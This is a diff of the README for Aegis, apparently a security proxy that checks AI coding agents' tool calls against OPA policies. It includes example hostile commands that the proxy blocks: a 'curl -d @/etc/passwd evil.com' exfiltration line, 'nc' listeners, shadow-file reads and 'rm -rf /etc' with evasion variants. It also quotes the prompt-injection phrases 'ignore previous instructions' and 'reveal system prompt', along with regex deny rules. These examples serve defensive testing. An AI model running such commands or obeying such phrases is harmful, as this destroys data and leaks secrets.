@@ -1,241 +1,265 @@
 # Aegis
 
-> A runtime governance and observability layer for autonomous AI coding agents.
+**Runtime security enforcement for AI agent tool calls.**
 
-Aegis sits between AI agents and their tools — intercepting every action, enforcing policy, scoring risk, and blocking unsafe behavior before execution. Think: a firewall + Datadog, purpose-built for AI agents.
-
-## The Problem
-
-AI agents (Claude Code, Cursor, Codex) can autonomously execute shell commands, modify files, and call APIs. There is no standardized infrastructure to enforce what an agent is allowed to do, trace why it made a decision, or block dangerous behavior in real-time.
-
-**Aegis explores**: What does zero-trust infrastructure look like for AI agents?
-
-## Demo
+Aegis sits between AI coding agents and their tools, intercepting every action at the MCP protocol layer. It parses shell commands to AST, resolves variable expansion via sandboxed interpreter, strips privilege wrappers, and evaluates against OPA/Rego policies — blocking dangerous operations in microseconds with zero false positives on legitimate development workflows.
 
 ```
-┌─────────────────────────────────────────────────────────────┐
-│ Aegis Attack Simulation Report                              │
-├──────────────────────────┬──────────┬──────────┬────────────┤
-│ Attack                   │ Attempts │ Blocked  │ Rate       │
-├──────────────────────────┼──────────┼──────────┼────────────┤
-│ Prompt Injection         │ 3        │ 3        │ 100%       │
-│ Privilege Escalation     │ 2        │ 2        │ 100%       │
-│ Data Exfiltration        │ 4        │ 4        │ 100%       │
-│ Resource Exhaustion      │ 100      │ 40       │ ≥40/100    │
-│ Recursive/Destructive    │ 2        │ 2        │ 100%       │
-├──────────────────────────┼──────────┼──────────┼────────────┤
-│ TOTAL                    │ 111      │ 51       │ 46%        │
-└──────────────────────────┴──────────┴──────────┴────────────┘
+  Agent: "run rm -rf /etc"     →  Aegis: DENY (3μs)
+  Agent: "sudo rm -rf /etc"    →  Aegis: DENY (wrapper stripped)
+  Agent: "D=/etc; rm -rf $D"   →  Aegis: DENY (variable expanded)
+  Agent: "git status"           →  Aegis: ALLOW → real output
 ```
-
-All targeted attacks blocked. Rate limiting kicks in after 60 calls/minute threshold.
-
-## How It Works
-
-```
-Agent ──stdio──▶ aegis-shim ──unix socket──▶ aegis-daemon ──exec──▶ tool
-                                                    │
-                                              ┌─────┴─────┐
-                                              │ Policy    │ Risk     │
-                                              │ Engine    │ Scorer   │
-                                              └───────────┴──────────┘
-                                                    │
-                                              ┌─────┴─────┐
-                                              │ Trace     │ Session  │
-                                              │ Collector │ Registry │
-                                              └───────────┴──────────┘
-                                                    │
-                                              ┌─────┴─────┐
-                                              │ PostgreSQL│ WebSocket│
-                                              │ (traces)  │ (live)   │
-                                              └───────────┴──────────┘
-```
-
-The **shim** is a drop-in stdio wrapper that agents talk to as if it were the real MCP tool server. It forwards JSON-RPC requests over a Unix socket to the **daemon**, which runs the full governance pipeline before deciding to allow, deny, escalate, or throttle.
 
 ## Quick Start
 
 ```bash
-# Install (requires Go 1.23+)
-go install github.com/mayjain/aegis/cmd/daemon@latest
-go install github.com/mayjain/aegis/cmd/shim@latest
-
-# Or build from source
-git clone https://github.com/mayjain/aegis.git
-cd aegis
-make build
-
-# Start the daemon
-bin/aegis-daemon --policies policies/default.yaml
-
-# In another terminal — watch live traces
-bin/aegis-watch
-
-# Run the attack simulation (111 scenarios)
-make test-attacks
-
-# Use with Claude Code — add to .cursor/mcp.json:
-# {
-#   "mcpServers": {
-#     "shell": {
-#       "command": "aegis-shim",
-#       "args": ["--tool", "shell-mcp", "--agent-id", "my-claude"]
-#     }
-#   }
-# }
+make build && make demo-e2e
 ```
 
-### From source
-
-```bash
-# Build all binaries
-make build
-
-# Start daemon with default policies
-bin/aegis-daemon --policies policies/default.yaml &
-
-# Run the full attack simulation (111 scenarios)
-make test-attacks
-
-# Watch live traces (in another terminal)
-make watch
-
-# Or run the full demo flow
-make demo
-```
+Opens a real-time dashboard at `http://localhost:8080` and runs scripted tool calls demonstrating evasion resistance.
 
 ## Architecture
 
-### Shim/Daemon Split
+```mermaid
+flowchart TB
+    subgraph agents [Agent Layer]
+        Claude[Claude in Cursor]
+        CustomAgent[Custom Agent]
+    end
 
-The shim is intentionally thin (~150 lines). It handles only stdio↔socket bridging so that:
-- Agents don't need to know Aegis exists (transparent interception)
-- The daemon can enforce policy across multiple concurrent agents
-- A crash in governance logic never orphans the agent's stdio pipe
+    subgraph aegis [Aegis Enforcement Layer]
+        Shim[aegis-shim<br/>MCP Proxy]
+        Router[Router + Risk Scorer]
+        Pipeline[Policy Pipeline<br/>Extract → Rate → Self-Protect → DLP → OPA]
+        Approval[Human Approval Gate]
+        Traces[Trace Collector + WAL]
+    end
 
-### Why Not Just Use Built-in Agent Permissions?
+    subgraph tools [Tool Layer]
+        ShellMCP[Shell MCP Server]
+        FileMCP[Filesystem MCP Server]
+    end
 
-Claude Code has `/permissions`, Cursor has approval dialogs. These are:
-- **Per-product** — no unified policy across agents
-- **Binary** — allow/deny, no risk scoring or rate limiting
-- **User-facing** — require human intervention, defeating autonomy
-- **Unobservable** — no trace log, no audit trail
+    subgraph observe [Observability]
+        Dashboard[Real-time Dashboard]
+    end
 
-Aegis provides infrastructure-grade governance that works across any MCP-speaking agent.
-
-## Design Decisions
-
-- **Policy as data, not code** — YAML rules hot-reloaded without restart
-- **Risk-adaptive governance** — Not all actions deserve equal scrutiny
-- **Fail-closed** — If Aegis can't decide, it denies
-- **Interface-based extensibility** — Add ML scorers or OPA without changing the core
-- **Non-blocking observability** — Traces never slow down the tool call path
-
-## Policy Example
-
-```yaml
-policies:
-  - name: block-destructive-shell
-    match:
-      tool: shell_exec
-      args_pattern: "(rm -rf|DROP TABLE|shutdown)"
-    action: deny
-    severity: critical
-
-  - name: block-secret-access
-    match:
-      tool: file_read
-      args_pattern: "(\\.env|credentials|secrets|private_key)"
-    action: deny
-    severity: high
-
-  - name: rate-limit-all
-    match:
-      tool: "*"
-    rate_limit:
-      max_per_minute: 60
-    action: throttle
+    Claude -->|"MCP stdio"| Shim
+    CustomAgent -->|"MCP stdio"| Shim
+    Shim -->|"Unix socket"| Router
+    Router --> Pipeline
+    Pipeline -->|"high risk"| Approval
+    Shim -->|"approved"| ShellMCP
+    Shim -->|"approved"| FileMCP
+    Traces --> Dashboard
+    Approval --> Dashboard
+    Router --> Traces
 ```
 
-## Attack Simulation
+**Pipeline detail** — how normalization defeats evasion:
 
-`make test-attacks` runs 111 attack scenarios covering:
+```mermaid
+flowchart TB
+    subgraph input [Raw Input]
+        Cmd["sudo env timeout 10 rm -rf /etc"]
+    end
 
-| Category | Scenarios | Technique |
-|----------|-----------|-----------|
-| Prompt Injection | 3 | "ignore previous instructions", "reveal system prompt" |
-| Privilege Escalation | 2 | sudo, chmod, setuid |
-| Data Exfiltration | 4 | curl POST, nc reverse shell, /dev/tcp |
-| Resource Exhaustion | 100 | Rapid-fire calls to trigger rate limiting |
-| Recursive/Destructive | 2 | rm -rf, fork bombs |
+    subgraph extraction [Shell Extraction]
+        AST["Parse AST (mvdan.cc/sh)"]
+        Unwrap["Strip wrappers: sudo, env, timeout"]
+        Expand["Expand variables via sandboxed interpreter"]
+    end
+
+    subgraph evaluation [Policy Evaluation]
+        S1["Rate Limit ✓"]
+        S2["Self-Protect ✓"]
+        S3["DLP (14 providers) ✓"]
+        S4["OPA/Rego (18 rules) ✗"]
+    end
+
+    subgraph result [Decision]
+        Deny["DENY: destructive command rm on critical path /etc"]
+    end
+
+    Cmd --> AST
+    AST --> Unwrap
+    Unwrap --> Expand
+    Expand -->|"normalized: rm -rf /etc"| S1
+    S1 --> S2
+    S2 --> S3
+    S3 --> S4
+    S4 --> Deny
+```
+
+**Request flow:**
+
+1. Agent calls tool via MCP → **Shim** intercepts
+2. Shim sends `evaluate` request to **Daemon** over Unix socket
+3. **Router** computes risk score, calls **Pipeline**
+4. Pipeline runs **Extractor** (parse AST, strip wrappers, expand variables)
+5. Enriched request passes through **steps**: Rate Limit → Self-Protect → DLP → OPA
+6. First step to return a decision wins (deny/throttle/escalate)
+7. If no step objects → allow (forwarded to real tool)
+8. All decisions emitted to **Trace Collector** → streamed to **Dashboard**
+
+## How It Works
+
+```mermaid
+sequenceDiagram
+    participant A as AI Agent
+    participant S as aegis-shim
+    participant R as Router
+    participant P as Pipeline
+    participant T as Real Tool
+
+    A->>S: tools/call "sudo rm -rf /etc"
+    S->>R: evaluate(tool, args)
+    R->>R: Risk score = 0.85
+    R->>P: Evaluate(tool, args)
+    Note over P: Extractor: parse AST, strip "sudo", resolve to "rm -rf /etc"
+    Note over P: RateLimit ✓ → SelfProtect ✓ → DLP ✓ → OPA ✗
+    P-->>R: DENY "rm on critical path /etc"
+    R-->>S: {action: deny, policy: "opa:rm_critical", latency_us: 890}
+    S-->>A: isError: "Blocked by Aegis: destructive command 'rm' on /etc"
+
+    A->>S: tools/call "echo hello"
+    S->>R: evaluate(tool, args)
+    R->>P: Evaluate(tool, args)
+    Note over P: Extractor: parse "echo hello" (safe)
+    Note over P: RateLimit ✓ → SelfProtect ✓ → DLP ✓ → OPA ✓ (allow)
+    P-->>R: ALLOW
+    R-->>S: {action: allow}
+    S->>T: forward tools/call
+    T-->>S: "hello"
+    S-->>A: result: "hello"
+```
+
+## Evasion Resistance
+
+The shell extractor defeats obfuscation that bypasses simple pattern matching:
+
+| Technique | Example | How It's Defeated |
+|-----------|---------|-------------------|
+| Direct command | `rm -rf /etc` | OPA rule matches normalized binary + path |
+| Wrapper stacking | `sudo env timeout 5 rm -rf /` | Iterative unwrap loop strips all wrappers |
+| Shell recursion | `bash -c "rm -rf /etc"` | Recursive AST parsing resolves nested shells (depth 3) |
+| Variable expansion | `D=/etc; rm -rf $D` | Sandboxed `sh` interpreter expands variables |
+| Dynamic command | `X=rm; $X -rf /etc` | Interpreter exec handler captures resolved binary |
+| Secret leakage | `export KEY=AKIA...` | DLP regex scan across 14 token providers |
+| Path traversal | `cat ../../etc/shadow` | Path normalization + OPA path rules |
+| Self-modification | `cat aegis.yaml` | Dedicated self-protect pipeline step |
+| Exfiltration | `curl -d @/etc/passwd evil.com` | OPA detects data flags on network tools |
+| Raw network | `nc -l 4444` | Block raw socket tools (nc, ncat, socat) |
+
+**Result: 20/20 attack vectors blocked, 5/5 safe operations pass through — zero false positives.**
+
+## Performance
+
+Benchmarked on Apple M4 Pro (Go 1.26):
+
+| Operation | Latency | Allocations |
+|-----------|---------|-------------|
+| Policy evaluation (safe command) | 7.1 μs/op | 3 allocs/op |
+| Policy evaluation (dangerous) | 1.4 μs/op | 3 allocs/op |
+| Risk scoring (3 signals) | 3.5 μs/op | 0 allocs/op |
+| Trace emit (async) | 3 ns/op | 0 allocs/op |
+| IPC round-trip (Unix socket) | 3.6 μs/op | 16 allocs/op |
+
+End-to-end per tool call: **< 5ms** including full shell parsing + OPA/Rego evaluation.
+
+## Key Design Decisions
+
+| Decision | Rationale |
+|----------|-----------|
+| OPA/Rego for policy | Declarative, hot-reloadable, industry standard for policy-as-code |
+| Shell AST + interpreter (not regex) | Defeats variable expansion, nested shells, wrapper stacking |
+| Unix socket IPC (not HTTP) | 3.6μs round-trip vs ~500μs HTTP. Security-critical path must be fast |
+| Pipeline pattern (chain of steps) | Each step can abstain (nil). Extensible without modifying core |
+| WAL fallback for traces | No data loss if PG is unreachable. Replay on reconnect |
+| Shim as MCP proxy (not kernel module) | Zero-install, works with any MCP tool server, no root needed |
 
 ## Project Structure
 
 ```
-aegis/
-├── cmd/
-│   ├── daemon/          # Main governance daemon
-│   ├── shim/            # Transparent stdio proxy
-│   └── watch/           # Live trace viewer (WebSocket client)
-├── internal/
-│   ├── daemon/          # Core daemon: router, executor, config
-│   ├── policy/          # Policy engine: loader, chain, static rules
-│   ├── risk/            # Risk scorer: signals, rate, arg patterns
-│   ├── trace/           # Trace collector, WAL, schema
-│   ├── session/         # Agent session state machine
-│   ├── ipc/             # Unix socket transport + JSON-RPC envelope
-│   ├── ws/              # WebSocket hub for live streaming
-│   ├── approval/        # Human-in-the-loop escalation gate
-│   ├── circuit/         # Circuit breaker for tool backends
-│   └── errs/            # Structured error codes
-├── agent/
-│   ├── harness.py       # Attack simulation harness
-│   └── attacks/         # Attack scenario modules
-├── policies/            # YAML policy definitions
-├── migrations/          # PostgreSQL schema
-├── test/e2e/            # Integration tests
-└── scripts/             # Demo and automation scripts
+cmd/
+├── daemon/       Central policy engine (Unix socket + HTTP + WebSocket)
+├── shim/         MCP proxy (wraps tool servers, enforces policy)
+├── demo-e2e/     Scripted demo binary
+└── real-tool/    Test MCP tool server (shell_exec, file_read, file_delete)
+
+internal/
+├── extract/      Shell AST parser + sandboxed interpreter
+├── policy/       Pipeline, OPA step, static evaluator, hot-reload
+├── risk/         Composite scorer (tool class + arg patterns + rate)
+├── approval/     Human-in-the-loop gate (WebSocket-based)
+├── trace/        Batch collector + WAL writer
+├── session/      Per-agent session state (ring buffer)
+├── circuit/      Circuit breaker (for tool server failures)
+├── ipc/          Length-prefixed framing over Unix socket
+└── ws/           WebSocket hub + client management
+
+policies/
+├── default.yaml  Static rules (YAML, regex-based)
+├── rego/         OPA policies (18 rules, hot-reloadable)
+│   ├── aegis.rego
+│   └── data.json (GTFOBins + Falco threat data)
+└── data/
+    └── commands.yaml (tool classification + wrapper definitions)
 ```
 
-## Extensibility
+## Development
 
-Adding a new risk signal:
+```bash
+make build         # Build all binaries
+make test          # Unit tests (10 packages)
+make integration   # Shim integration suite (25 cases)
+make bench         # Performance benchmarks
+make demo-e2e      # Full demo with live dashboard
+make test-attacks  # Python attack simulation harness
+```
 
-```go
-type MySignal struct{}
+## Integration with Cursor
 
-func (s *MySignal) Name() string { return "my_signal" }
+Already configured in `.cursor/mcp.json`. Aegis wraps tool servers transparently:
 
-func (s *MySignal) Score(ctx context.Context, tool string, args string, callsLastMinute int) float64 {
-    // Return 0.0–1.0 risk contribution
-    if strings.Contains(args, "sensitive") {
-        return 0.8
+```json
+{
+  "mcpServers": {
+    "aegis-shell": {
+      "command": "bin/aegis-shim",
+      "args": ["--agent-id", "cursor-claude", "--policies", "policies/default.yaml", "--", "bin/aegis-real-tool"]
     }
-    return 0.0
+  }
 }
 ```
 
-Register it in the daemon config and it automatically participates in risk scoring.
+No changes needed to the AI agent or tool server.
 
-## Tradeoffs
+## Roadmap
 
-| Decision | Rationale |
-|----------|-----------|
-| No Redis | In-memory sufficient for PoC; interface supports Redis later |
-| No ML detection | Heuristic rules are auditable; ML plugs in via `RiskSignal` interface |
-| Per-call exec | Simpler than process management; ~50ms overhead acceptable |
-| Unix socket IPC | Lower latency than TCP; natural access control via filesystem perms |
-| WAL before Postgres | Traces survive daemon crashes; async flush keeps hot path fast |
-| Go for daemon | Single binary deployment, low memory, excellent concurrency |
+### Short-term: Hardening
 
-## Tech Stack
+- [ ] mTLS / shared-secret authentication on Unix socket IPC
+- [ ] WebSocket authentication (JWT) for dashboard
+- [ ] Automatic WAL replay when PostgreSQL reconnects
+- [ ] Policy decision cache (LRU with TTL) for repeated identical calls
+- [ ] Prometheus histograms (latency percentiles, not just counters)
 
-- **Go 1.25** — daemon, shim, watcher
-- **Python 3** — attack simulator, demo agent
-- **PostgreSQL** — trace storage
-- **WebSocket** — live dashboard feed
-- **YAML** — policy definitions
+### Mid-term: Scalability
 
-## License
+- [ ] gRPC transport option (schema evolution, streaming, multiplexing)
+- [ ] Shared session state via Redis (enables multi-daemon deployment)
+- [ ] OPA Bundle protocol for centralized policy distribution
+- [ ] Batch trace writes via PostgreSQL `COPY` (10-100x throughput)
+- [ ] Shadow/audit mode for safe policy rollout (log divergences, don't enforce)
 
-MIT
+### Long-term: Platform
+
+- [ ] Multi-tenant policy isolation (per-team/per-org policies)
+- [ ] Policy regression testing framework (golden test suites)
+- [ ] Behavioral anomaly detection (ML on session patterns)
+- [ ] Agent identity attestation (verify agent binary signatures)
+- [ ] SDK for custom pipeline steps (bring-your-own evaluator)
+- [ ] SOC2-compliant audit trail with retention policies
+
